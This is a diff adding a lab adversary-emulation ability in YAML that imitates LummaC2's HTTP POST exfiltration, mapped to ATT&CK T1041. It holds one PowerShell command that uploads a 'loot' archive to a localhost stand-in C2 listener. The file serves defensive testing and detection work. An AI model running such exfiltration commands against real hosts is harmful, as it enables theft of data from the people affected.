@@ -1,0 +1,15 @@
+---
+# A5 — Exfiltration: HTTP POST the decoy archive to the local stand-in C2
+- id: 5af67cec-8f0b-4ef7-b478-57beca0411df
+  name: Exfiltrate over HTTP to local C2 (lab-safe)
+  description: Uploads the decoy archive to the localhost listener, mimicking LummaC2's HTTP POST exfiltration (AA25-141B). Traffic never leaves 127.0.0.1.
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: "Exfiltration Over C2 Channel"
+  executors:
+    - platform: windows
+      name: psh
+      command: |
+        Invoke-RestMethod -Uri http://127.0.0.1:8080/upload -Method Post -InFile C:\attack-test\loot.zip
+  # Real technique imitated also maps to T1071.001 (Web Protocols) for the channel.
